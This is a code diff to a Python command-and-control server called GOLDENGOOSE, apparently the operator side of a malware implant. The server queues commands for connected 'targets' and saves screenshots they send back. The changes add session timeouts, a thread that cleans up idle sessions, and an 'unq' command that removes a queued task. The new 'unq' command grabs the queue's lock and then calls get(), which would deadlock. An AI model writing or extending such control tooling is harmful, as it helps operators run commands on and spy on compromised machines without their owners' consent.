@@ -9,11 +9,15 @@ import time
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import tempfile
 
+# Timeout for when a client is considered disconnected
+SESSION_TIMEOUT = 60
+
 # Globals to keep track of sessions and session data
-sessions          = {'0':0}
-session_queues    = {'0':queue.Queue()}
-session_commands  = {'0':[]}
-selected_session = '0'
+sessions          = {'0':0}             # Currently seen clients
+session_last_seen = {'0':0}             # Last seen timestamp of a client
+session_queues    = {'0':queue.Queue()} # Queued commands for the client
+session_commands  = {'0':[]}            # Available commands that the client can run
+selected_session = '0'                  # The session to interact with
 
 # The port for GOLDENGOOSE clients to connect to
 C2_LISTEN_ADDR = "127.0.0.1"
@@ -27,6 +31,24 @@ def bmp(data):
         return f.name
     except Exception as e:
         return f"Error saving screenshot: {e}"
+
+def clean_sessions_thread():
+    global sessions
+    global session_last_seen
+    global session_queues
+
+    while True:
+        for session in session_last_seen:
+            if session == '0':
+                continue
+            # Remove the session if it exceeds timeout
+            if (time.time() - session_last_seen[session]) > SESSION_TIMEOUT:
+                print("Session [{}] has timed out...".format(session))
+                _ = sessions.pop(session)
+                _ = session_last_seen.pop(session)
+                _ = session_queues.pop(session)
+                break
+        time.sleep(30)
 
 class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
@@ -58,6 +80,7 @@ class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
                     print(line)
 
         if clientid:
+            session_last_seen[clientid] = time.time()
             if clientid not in sessions:
                 print("\n[+] Adding clientid: {}".format(clientid))
                 sessions[clientid] = 0
@@ -102,7 +125,7 @@ def user_interface():
     while True:
         display_block  = "[ === ===  GOLDENGOOSE  === === ]\n"
         if selected_session != '0':
-            display_block += "[  bg|background, " + ', '.join(session_commands[selected_session]) + "\n"
+            display_block += "[  bg|background, unq, " + ', '.join(session_commands[selected_session]) + "\n"
             display_block += "[ Queued for target:\n"
             with session_queues[selected_session].mutex:
                 for i,item in enumerate(list(session_queues[selected_session].queue)):
@@ -121,6 +144,9 @@ def user_interface():
         # builtin commands            
         if command in ['bg', 'background']:
             selected_session = '0'
+        elif command.startswith('unq'):
+            with session_queues[selected_session].mutex:
+                _ = session_queues[selected_session].get()
         elif command.startswith('select'):
             clientid = command.split(' ')[1]
             if clientid in sessions:
@@ -157,6 +183,9 @@ if __name__ == "__main__":
     server_thread = threading.Thread(target=run_server)
     server_thread.daemon = True
     server_thread.start()
+    cleaner = threading.Thread(target=clean_sessions_thread)
+    cleaner.daemon = True
+    cleaner.start()
     
     time.sleep(1) # Let the server startup before presenting interface
     user_interface()
